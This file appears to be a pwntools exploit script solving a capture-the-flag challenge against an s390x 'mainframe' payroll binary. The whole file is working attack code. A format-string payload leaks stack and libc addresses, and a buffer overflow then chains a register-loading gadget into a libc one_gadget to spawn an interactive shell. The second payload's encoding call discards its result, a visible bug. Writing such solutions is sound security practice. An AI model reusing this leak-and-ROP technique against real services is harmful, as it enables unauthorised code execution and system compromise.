from pwn import *


def encode_payload(payload: bytes) -> bytes:
    # Convert from immutable `bytes` to mutable `bytearray`
    payload = bytearray(payload)
    for i in range(1024):
        payload[i] ^= 0x52
    return bytes(payload)


context.endian = 'big'
libc_elf = ELF('./bin/libc.so.6')
mainframe_elf = ELF('./bin/mainframe')

# LIBC OFFSETS
onegadget_offset = 0xda37a  # Assume r8 and r10 are null - they get moved into r3 r4 for us
load_regs_gadget_offset = 0x2ab38  # lmg %r8, %r15, 224(%r15) ; br %r14
libc_start_main_leak_offset = 0x2a7f0

# MAINFRAME VARIABLES
address_of_main = mainframe_elf.symbols['main']
main_prompt = "Enter payroll data:\n"
processing_prompt = "Processing data...\n"

# Regular
#io = remote("0.cloud.chals.io", 26779)
io = remote("localhost", 9999)
# Debug
#io = remote("localhost", 8888)

io.recvuntil(main_prompt)

length_till_pc_control = 1144
# leak stored %r15 for stack and %r14 for libc. Set return address to &main so we get a second shot
leak_fmts = b"%149$p...%195$p\n"
#leak_fmts = b"%p\n" * 160
payload = leak_fmts + cyclic(length_till_pc_control - len(leak_fmts)) + p64(address_of_main)
payload = encode_payload(payload)
io.send(payload)
io.recvuntil(processing_prompt)

stack_leak, libc_leak, = io.recvline().split(b'...')
libc_base = int(libc_leak, 16) - libc_start_main_leak_offset
info(f"{libc_base=:#x}")
stack_leak = int(stack_leak, 16)
info(f"{stack_leak=:#x}")
onegadget = libc_base + onegadget_offset
load_regs_gadget = libc_base + load_regs_gadget_offset
info(f"{onegadget=:#x}")

# Send second payload, with exploit to one_gadget (plus a setup gadget)
io.recvuntil(main_prompt)
payload = cyclic(1032) + p64(0) + p64(9) + p64(0) + p64(11) + p64(12) + p64(13) + p64(onegadget) + p64(15) + b'B'*(length_till_pc_control - 1096) + p64(load_regs_gadget) + p64(stack_leak - 224)  # The -224 accounts for the fact that our gadget loads from `224(%r15)`
encode_payload(payload)
io.send(payload)

io.interactive()
